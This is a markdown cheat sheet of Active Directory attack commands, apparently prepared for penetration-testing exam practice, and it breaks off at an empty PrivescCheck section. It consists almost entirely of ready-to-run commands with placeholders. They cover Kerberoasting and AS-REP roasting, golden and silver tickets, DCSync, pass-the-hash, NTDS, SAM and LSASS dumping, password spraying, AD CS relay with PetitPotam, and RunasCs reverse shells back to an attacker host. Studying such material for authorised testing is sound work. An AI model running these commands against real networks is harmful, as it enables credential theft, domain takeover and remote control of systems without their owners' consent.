# Active Directory commands

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.

## Active Directory

### Manual Enumeration

```powershell
net user /domain                                                               # list domain users
net group /domain                                                              # list domain groups
net group "<GROUP>" /domain                                                    # list domain group members
Get-NetDomain                                                                  # show current AD domain
Get-NetUser | select cn,pwdlastset,lastlogon                                   # list users with password and logon fields
Get-NetGroup | select cn                                                       # list domain groups
Get-NetGroup "<GROUP>" | select member                                         # list group members
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion    # list domain computers
Find-LocalAdminAccess                                                          # find machines where current user is local admin
Get-NetSession -ComputerName <RHOST>                                           # list sessions on remote host
Convert-SidToName S-1-5-21-...                                                 # resolve SID to name
```

### Object Permission Enumeration

| Permission | Description |
| --- | --- |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes |
| WriteOwner | Change ownership |
| WriteDACL | Edit ACEs |
| AllExtendedRights | Change/reset password |
| ForceChangePassword | Password change |
| Self (Self-Membership) | Add self to group |

```powershell
Get-ObjectAcl -Identity <USERNAME>                                                                                                     # enumerate object ACLs
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights    # find GenericAll rights
```

### AS-REP Roasting

```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast         # unauthenticated AS-REP roast users
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile hashes.asreproast    # authenticated AS-REP roast
.\Rubeus.exe asreproast /nowrap                                                                              # AS-REP roast from Windows
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule                 # crack AS-REP hashes
```

### Kerberoasting

```bash
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request                                                # request Kerberoast tickets
faketime 'now + 8 hours' impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-host <FQDN>    # Kerberoast with time skew
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast                                                                         # Kerberoast from Windows
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule                               # crack Kerberoast hashes
```

### Silver Tickets

```bash
# Gather: NTLM of service account, Domain SID, Target SPN
iwr -UseDefaultCredentials http://<RHOST>    # test default credentials to service
mimikatz                                     # sekurlsa::logonpasswords
whoami /user                                 # capture current user SID
mimikatz                                     # kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:<NTLM> /user:<USERNAME>
klist                                        # confirm injected silver ticket
```

### Golden Tickets

```bash
mimikatz                      # lsadump::lsa /patch                    # get krbtgt hash
mimikatz                      # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt
.\PsExec.exe \\<RHOST> cmd    # use hostname, not IP
```

### DCSync

```bash
mimikatz                                                                                     # lsadump::dcsync /user:<DOMAIN>\Administrator          # DCSync Administrator with Mimikatz
impacket-secretsdump -just-dc-user Administrator <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>    # DCSync one user with Impacket
```

### Pass the Hash

```bash
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<RHOST>                                   # pass-the-hash with WMIExec
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes <LM_HASH>:<NTLM_HASH>                  # pass-the-hash with PsExec
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard    # pass-the-hash with RDP
```

### Lateral Movement

```powershell
# WMI
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"    # create remote process with WMI

# WinRS
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"              # execute remote command with WinRS
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e <B64>"    # launch encoded remote PowerShell

# PSExec
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd    # interactive remote cmd with PsExec
```

### Volume Shadow Copy (ntds.dit)

```bash
vshadow.exe -nw -p C:                                                                         # create C: volume shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak    # copy ntds.dit from shadow copy
reg.exe save hklm\system C:\system.bak                                                        # save SYSTEM hive
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL                              # dump domain hashes offline
```

## AD CS (Active Directory Certificate Services)

```bash
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout    # enumerate vulnerable AD CS templates
```

| ESC | Technique |
| --- | --- |
| ESC1 | Misconfigured template — enroll with alt UPN |
| ESC2 | Any Purpose EKU abuse |
| ESC3 | Enrollment agent template |
| ESC4 | Writable template ACL |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA |
| ESC7 | Vulnerable CA ACL |
| ESC8 | NTLM relay to AD CS HTTP |
| ESC9 | No security extensions |
| ESC10 | Weak certificate mappings |

```bash
# ESC1
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>    # request cert with alternate UPN
certipy auth -pfx administrator.pfx -dc-ip <RHOST>                                                                                         # authenticate with issued certificate

# ESC8 - NTLM Relay
certipy relay -target 'http://<CA>'                         # relay NTLM to AD CS HTTP endpoint
python3 PetitPotam.py <RHOST> <DOMAIN>                      # coerce machine authentication
certipy auth -pfx dc.pfx -dc-ip <RHOST>                     # authenticate as machine with PFX
export KRB5CCNAME=dc.ccache                                 # use machine Kerberos cache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>    # dump secrets with machine ticket

# CSR / certificate handling
openssl req -new -newkey rsa:2048 -nodes -keyout <CERT>.key -out <CERT>.csr -subj "/CN=<FQDN>" -addext "subjectAltName=DNS:<FQDN>"    # generate key and CSR with SAN
certreq -submit -config "<CA_HOST>\<CA_NAME>" -attrib "CertificateTemplate:<TEMPLATE>" <CERT>.csr <CERT>.cer                          # submit CSR to AD CS
openssl pkcs12 -export -inkey <CERT>.key -in <CERT>.cer -out <CERT>.pfx                                                               # bundle cert and key as PFX
openssl pkcs12 -in <CERT>.pfx -out <CERT>.crt -clcerts -nokeys -passin pass:'<PASSWORD>'                                              # extract certificate from PFX
openssl pkcs12 -in <CERT>.pfx -out <CERT>.key -nocerts -nodes -passin pass:'<PASSWORD>'                                               # extract private key from PFX
```

## BloodHound

```bash
# Setup
sudo neo4j console    # start Neo4j database
bloodhound            # launch BloodHound GUI

# Collection
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip                            # collect BloodHound data with password
KRB5CCNAME=user.name.ccache faketime 'now + 8 hours' bloodhound-python -k -u user.name -d FQDN -c All -ns <IP> --disable-autogc    # collect with Kerberos ticket

# Kerberos time skew
faketime 'now + 8 hours' bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DOMAIN> -c all --disable-autogc    # collect while offsetting clock
```

## NetExec

Reference: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0

```bash
# Install / help
pipx install netexec                                   # install NetExec in pipx
sudo apt install netexec                               # install NetExec from distro packages
nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> [FLAGS]    # basic syntax
nxc <PROTOCOL> -L                                      # list modules for protocol
nxc <PROTOCOL> -M <MODULE> --options                   # show module options

# Targets / global options
nxc smb <RHOST>                                                      # single target
nxc smb <CIDR>                                                       # CIDR range
nxc smb targets.txt                                                  # target file
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --verbose            # verbose output
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --log output.log     # log output
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <IP>    # use custom DNS server

# Password spraying / auth controls
nxc smb targets.txt -u users.txt -p passwords.txt -d <DOMAIN> --continue-on-success    # domain spray and keep going
nxc smb targets.txt -u users.txt -p '<PASSWORD>' -d <DOMAIN> --continue-on-success     # single-password spray
nxc smb targets.txt -u users.txt -p passwords.txt --local-auth                         # local account spray
nxc smb targets.txt -u users.txt -p passwords.txt --no-bruteforce                      # stop after first valid per target
nxc smb targets.txt -u users.txt -p passwords.txt --jitter 5                           # add delay jitter
nxc smb targets.txt -u users.txt -p passwords.txt --gfail-limit 10                     # global fail limit
nxc smb targets.txt -u users.txt -p passwords.txt --ufail-limit 3                      # per-user fail limit
nxc smb targets.txt -u users.txt -p passwords.txt --fail-limit 5                       # per-host fail limit

# Authentication methods
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>                                                                   # domain password auth
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth                                                                  # local password auth
nxc smb <RHOST> -u '<USERNAME>' -H '<NTLM_HASH>'                                                                              # pass-the-hash
nxc smb <RHOST> -u '<USERNAME>' -H '<LM_HASH>:<NTLM_HASH>'                                                                    # pass LM:NTLM hash pair
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -k                                                                # Kerberos with password
nxc smb <RHOST> -u '<USERNAME>' --use-kcache -k                                                                               # Kerberos from ccache
nxc smb <RHOST> -u '<USERNAME>' --aesKey <AES_KEY> -k                                                                         # Kerberos with AES key
nxc smb <RHOST> --pfx-cert cert.pfx --pfx-pass '<PASSWORD>'                                                                   # certificate auth with PFX
nxc smb <RHOST> --pem-cert cert.pem --pem-key key.pem                                                                         # certificate auth with PEM
faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -k --generate-tgt <CCACHE_NAME>    # generate TGT while offsetting local time
faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<HOSTNAME>$' -p '<HOST_PASSWORD>' -k --generate-tgt <HOSTNAME>         # generate host machine-account TGT while offsetting local time

# SMB enumeration
nxc smb <CIDR>                                                                          # check SMB version/signing
nxc smb <CIDR> --gen-relay-list relay.txt                                               # find SMB relay targets
nxc smb <RHOST> -u '' -p '' --pass-pol                                                  # password policy
nxc smb <RHOST> -u '' -p '' --shares                                                    # anonymous shares
nxc smb <RHOST> -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'    # RID brute valid users
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --filter-shares read,write     # readable/writable shares
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dir "C$"                              # list directory contents
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users                                 # enumerate users
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users --enabled                       # enabled users
# NetExec moved group enumeration from smb to ldap; use ldap --groups below.
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --computers                             # enumerate computers
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-groups                          # enumerate local groups
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions                          # active SMB sessions
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users                        # logged-on users
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks                                 # enumerate disks
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --interfaces                            # enumerate network interfaces
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --qwinsta                               # RDP sessions
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --tasklist                              # running processes

# SMB spider / files / execution
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --spider-folder Users --pattern password       # search share names
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --regex ".*\\.txt$" --content                  # regex and content search
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true                       # recursive SMB spidering and download discovered files
nxc smb <RHOST> -d <DOMAIN> -u '<USERNAME>' -H '<NTLM_HASH>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=. MAX_FILE_SIZE=<BYTES>    # spider/download SMB files with pass-the-hash; raise max file size for large downloads
# Use faketime when local clock skew breaks auth; DOWNLOAD_FLAG saves discovered files and OUTPUT_FOLDER=. writes them under the current directory.
faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.    # recursive SMB spidering with downloads
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file "\\Windows\\Temp\\file.txt" ./file.txt          # download file
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file ./payload.exe "\\Windows\\Temp\\payload.exe"    # upload file
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x "whoami"                                                # execute cmd.exe command
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X '$PSVersionTable'                                       # execute PowerShell command
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --exec-method wmiexec -x "whoami"                          # choose exec method
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --wmi "SELECT * FROM Win32_Process"                        # WMI query over SMB

# SMB credential dumping / modules
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                          # dump SAM hashes
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                          # dump LSA secrets
nxc smb <DC> -u '<USERNAME>' -p '<PASSWORD>' --ntds                            # dump NTDS from DC
nxc smb <DC> -u '<USERNAME>' -p '<PASSWORD>' --ntds --enabled                  # dump enabled domain accounts only
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies                # dump DPAPI secrets/cookies
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sccm wmi                     # dump SCCM data via WMI
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                      # dump LSASS with lsassy
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump                    # dump LSASS with nanodump
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus                 # recursive share spidering
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password                # find GPP passwords
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av                     # enumerate AV products
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_ca                     # enumerate AD CS CAs
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler                     # check print spooler
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav                      # check WebClient/WebDAV
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M rdp -o ACTION=enable        # enable RDP
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wdigest -o ACTION=enable    # enable WDigest
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M keepass_discover            # find KeePass artifacts
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M winscp                      # dump WinSCP creds
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wifi                        # dump WiFi creds

# LDAP
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users                                 # enumerate AD users
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --groups                                # enumerate AD groups
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --computers                             # enumerate computers
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --dc-list                               # list domain controllers
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --get-sid                               # get domain SID
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --active-users                                      # active AD users
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --admin-count                                       # adminCount=1 users
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation                            # delegation targets
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --password-not-required                             # accounts with PASSWD_NOTREQD
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation                                   # delegation relationships
faketime 'now + <HOURS> hours' netexec ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation    # delegation relationships with local clock offset
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                                              # enumerate gMSA accounts
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --query "(objectClass=user)" "cn,sAMAccountName"    # custom query
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting                # collect Kerberoast hashes
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast                      # collect AS-REP roast hashes
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <IP> --bloodhound -c All               # collect BloodHound data
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M adcs                                             # find AD CS/PKI
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M laps                                             # dump LAPS passwords if allowed
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker                                     # check LDAP signing/channel binding
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M maq                                              # MachineAccountQuota
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts                                      # enumerate trusts
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc                                        # inspect user descriptions
nxc ldap <DC_FQDN> -k --kdcHost <DC_FQDN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read       # read all ACEs on a target object with Kerberos
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read                  # read all ACEs on target object
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read PRINCIPAL=<USER>    # read rights a principal has on target
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<TLD>" ACTION=read RIGHTS=DCSync    # find principals with DCSync rights
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read ACE_TYPE=denied    # read denied ACEs on target
nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=targets.txt ACTION=backup                     # backup DACLs for target list

# WinRM / WMI / RDP
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>                          # test WinRM credentials
nxc winrm <RHOST> -u '<USERNAME>' -H '<NTLM_HASH>'                                     # WinRM pass-the-hash
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth                         # WinRM local auth
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --port 5985 5986                     # check HTTP/HTTPS ports
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x "whoami"                          # execute cmd over WinRM
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X '$PSVersionTable'                 # execute PowerShell over WinRM
nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                                # dump SAM over WinRM
nxc wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --wmi "SELECT * FROM Win32_Service"    # WMI query
nxc wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x "whoami"                            # execute through WMI
nxc rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>'                                        # check RDP auth
nxc rdp <RHOST> -u '<USERNAME>' -H '<NTLM_HASH>'                                       # check RDP pass-the-hash
nxc rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot --screentime 10           # RDP screenshot

# MSSQL
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth             # MSSQL local auth
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>              # MSSQL domain auth
nxc mssql <RHOST> -u '<USERNAME>' -H '<NTLM_HASH>'                         # MSSQL pass-the-hash
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -q "SELECT @@version"    # run query
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x "whoami"              # run xp_cmdshell command
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_logins           # enumerate SQL logins
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_links            # enumerate linked servers
nxc mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv            # enumerate/exploit SQL privileges

# SSH / FTP / VNC / NFS
nxc ssh <RHOSTS> -u userfile -p passwordfile --no-bruteforce                           # test user/password pairs over SSH
nxc ssh <RHOST> -u '<USERNAME>' --key-file id_rsa                                      # SSH key auth
nxc ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sudo-check                           # check sudo rights
nxc ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /etc/passwd ./passwd.txt    # SSH download
nxc ftp <RHOST> -u anonymous -p '' --ls                                                # FTP anonymous listing
nxc ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get file.txt                         # FTP download
nxc vnc <RHOST> -u '<USERNAME>' -p passwords.txt                                       # VNC password test
nxc vnc <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot                           # VNC screenshot
nxc nfs <RHOST> --shares                                                               # enumerate NFS shares
nxc nfs <RHOST> --share /export --ls                                                   # list NFS share
nxc nfs <RHOST> --share /export --get-file remote.txt local.txt                        # download from NFS

# NetExec database
cmedb                 # open NetExec database console
(cmedb) export smb    # export SMB results from cmedb
```

## Evil-WinRM

```bash
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>                                      # open WinRM shell with password
evil-winrm -i <RHOST> -c /PATH/TO/<CERT>.crt -k /PATH/TO/<KEY>.key -u <USERNAME> -S    # open WinRM shell with certificate
evil-winrm -i <RHOST> -r <REALM>                                                       # open WinRM shell using Kerberos realm
```

## Impacket Reference

```bash
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/                                                     # enumerate AD users
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>                              # AS-REP roast without password
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request                           # Kerberoast SPNs
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>                                             # enumerate SIDs and users
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>                                                      # dump remote secrets
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL                                 # dump local hives offline
impacket-psexec <USERNAME>@<RHOST>                                                                    # execute shell with PsExec
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass                                              # execute shell with Kerberos WMI
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>                                             # connect to SMB with Impacket
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>                      # relay NTLM to LDAP and grant rights
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>                                           # enumerate delegation with hash
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>    # request delegated service ticket
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>                                                        # request TGT with password

export KRB5CCNAME=<USERNAME>.ccache                        # select Kerberos ccache
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass    # PsExec using Kerberos ticket
```

## bloodyAD

```bash
# GET
bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get writable                                      # list objects/attributes the current user can modify
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<TLD>' --type user                       # list domain user objects
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota    # read MAQ value
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                      # read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get membership <USER>                                                 # Group membership determines effective user privileges.
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<sAMAccountName>'                                         # Queries a domain sAMAccountName using valid LDAP credentials.
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "Domain Admins" --attr member                              # Lists high-privileged Domain Admin members.
# ADD
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'    # add user to group
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH       # disable preauth requirement

# SET
bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set restore 'CN=<NAME>\0ADEL:<OBJECT_GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'    # restore deleted AD object; use exact tombstone DN
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                                                     # set AD user password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> -f ACCOUNTDISABLE                                                       # disable user account
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> -f ACCOUNTDISABLE                                                    # enable user account
```

## AD DNS

```bash
python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a add -d <LHOST> <DC_IP>    # add AD-integrated DNS A record
python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a remove <DC_IP>            # remove AD-integrated DNS record
nslookup <HOSTNAME>.<DOMAIN> <DC_IP>                                                                                    # verify DNS record from DC
```

## Shadow Credentials

```bash
certipy-ad shadow auto -u '<USERNAME>@<DOMAIN>' -k -account '<ACCOUNT>$' -dc-ip <DC_IP> -target <DC_FQDN>                    # Abuses shadow credentials to obtain Kerberos auth as a target account. GenericWrite
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>    # add shadow credentials
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache                # request TGT with PFX
export KRB5CCNAME=<USERNAME>.ccache                                                                                          # use generated ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>                                                                          # recover NT hash from PKINIT key
```

## PassTheCert

```bash
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt                                                                                                                 # extract certificate from PFX
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key                                                                                                                # extract private key from PFX
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key    # modify user via certificate auth
```

## Rubeus

```bash
.\Rubeus.exe dump /nowrap                                                      # dump Kerberos tickets
.\Rubeus.exe asreproast /nowrap                                                # perform AS-REP roasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast                             # perform Kerberoasting
.\Rubeus.exe tgtdeleg /nowrap                                                  # request delegated TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:<CERT> /getcredentials    # request TGT with certificate
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>                                          # pass Kerberos ticket
```

## RunasCs

```bash
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>                    # run reverse shell as user
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac       # run reverse shell with UAC bypass
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>    # run domain user reverse shell
```

## Seatbelt

```bash
.\Seatbelt.exe -group=system    # run system-focused checks
.\Seatbelt.exe -group=all       # run all Seatbelt checks
```

## PrivescCheck

```bash
